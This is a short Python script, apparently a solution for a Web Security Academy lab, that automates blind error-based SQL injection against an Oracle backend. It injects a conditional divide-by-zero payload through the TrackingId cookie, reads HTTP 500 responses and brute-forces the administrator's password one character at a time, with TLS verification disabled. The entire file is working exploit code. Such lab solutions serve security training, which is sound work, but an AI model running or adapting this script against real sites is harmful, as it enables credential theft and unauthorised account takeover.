import sys
import requests
import urllib.parse
import urllib3

#--------------------------------------------------------------------------#
#                                 CHANGEME                                 #
URL = 'https://ac121f1e1f9bdaf0c04a277700de005c.web-security-academy.net/' #
TRACKING_ID = 'NbTCv09dgT5zAsrg'                                           #
SESSION_COOKIE = 'YsqLLGETkMlFgtNpUtHj8xRsaroOxXiv'                        #
#--------------------------------------------------------------------------#

# Suppress SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def error_sqli():
    password = ""
    # len(password) = 20
    # This was verified using the following payload:
    # TrackingId=GXksWCmzmiODlBfb' AND (SELECT LENGTH(password) FROM users WHERE username='administrator') = 20-- 
    for i in range(1, 21):
        for j in range(32, 126):
            # We are dealing with an Oracle database
            payload = f"' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND ASCII(SUBSTR(password,{i},1))='{j}') || '"
            encoded_payload = urllib.parse.quote(payload)

            cookies = {
                'TrackingId': TRACKING_ID + encoded_payload,
                'session': SESSION_COOKIE
            }

            r = requests.get(URL, cookies=cookies, verify=False)

            # "True" case
            if r.status_code == 500:
                password += chr(j)
                print('\r' + password, flush=True, end='')
                # Move on to the next character
                break
            # "False" case
            else:
                print('\r' + password + chr(j), flush=True, end='')

if __name__ == "__main__":
    error_sqli()
